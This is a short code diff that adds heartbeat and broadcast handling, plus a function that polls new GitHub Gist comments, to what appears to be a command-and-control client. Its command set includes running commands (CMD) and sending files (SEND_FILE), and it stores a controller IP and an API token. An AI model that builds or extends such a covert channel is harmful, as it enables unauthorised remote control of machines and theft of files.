@@ -7,8 +7,10 @@ CONTROLLER_IP = ""
 GIT_API_TOKEN = ""
 GIST_ID = ""
 
+BROADCAST = 0
+
 class Command(Enum):
-    NONE = 0
+    HEARTBEAT = 0
     CMD = 1
     SEND_FILE = 2
 
@@ -36,6 +38,19 @@ def post_gist_comment(msg):
 
     response = perform_command(cmd)
     return response
+
+
+def get_fresh_comments(last_seen):
+    _, data = read_last_gist_comments()
+
+    first_new = 0
+    for i in reversed(range(len(data))):
+        id = data[i]['id']
+        if id <= last_seen: break
+        first_new = i
+
+    last_seen = data[-1]['id']
+    return data[first_new:], last_seen
 
 
 # TODO: Last page can contain only few comments.
